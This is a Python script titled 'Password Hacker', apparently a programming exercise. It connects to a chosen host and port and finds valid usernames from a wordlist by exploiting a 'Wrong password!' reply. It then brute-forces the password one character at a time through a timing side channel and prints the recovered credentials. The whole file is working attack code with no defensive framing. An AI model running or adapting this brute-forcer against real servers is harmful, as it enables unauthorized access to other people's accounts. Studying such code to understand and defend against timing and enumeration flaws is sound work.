from __future__ import annotations

import argparse
import json
import string
import socket
import time

from typing import Callable, TextIO, TypedDict, Text


class JsonConfig(TypedDict):
    """A configuration for the dict that will be converted to json.

    Attributes:
        :login: The username of a account.
        :password: The password of a account.
    """
    login: Text
    password: Text


def timer(func):
    def wrapper(args_for_function) -> tuple(Callable, float):
        start = time.time()
        wrapped = func(args_for_function)
        end = time.time()
        duration_in_secs = end - start
        return wrapped, duration_in_secs

    return wrapper

@timer
def get_response(client_socket_: socket) -> socket:
    return client_socket_.recv(1024)

def attempt_username(usernames: TextIO, client_socket_: socket) -> str:
    for username in usernames:
        login_strip = username.strip('\n')
        login_json: JsonConfig = {"login": login_strip, "password": " "}
        data = json.dumps(login_json).encode()

        client_socket_.send(data)

        response = client_socket_.recv(1024)

        json_response: dict = json.loads(response.decode())

        if json_response["result"] == "Wrong password!":
            return login_strip

def attempt_pass(username: str, correct_sequence: str, client_socket_: socket) -> str:
    for char in (string.ascii_letters + string.digits):
        current_pass = str(correct_sequence) + char
        login_search: JsonConfig = {"login": username, "password": current_pass}
        data = json.dumps(login_search).encode()

        client_socket_.send(data)

        response, duration_secs = get_response(client_socket_)

        json_response: dict = json.loads(response.decode())

        if duration_secs >= 0.01:
            return current_pass

        if json_response["result"] == "Connection success!":
            print(json.dumps(login_search, indent=4))
            exit()


def main():
    parser = argparse.ArgumentParser(description='Password Hacker')
    parser.add_argument("hostname", metavar="", help="IP Address")
    parser.add_argument("port", type=int, metavar="", help="IP Address")
    args = parser.parse_args()

    # working with a socket as a context manager
    with socket.socket() as client_socket, open("logins.txt") as logins:
        address: tuple(str, int) = (args.hostname, args.port)

        client_socket.connect(address)

        login: str = attempt_username(logins, client_socket)
        current_pass: str = ""

        while True:
            current_pass: str = attempt_pass(login, current_pass, client_socket)


if __name__ == "__main__":
    main()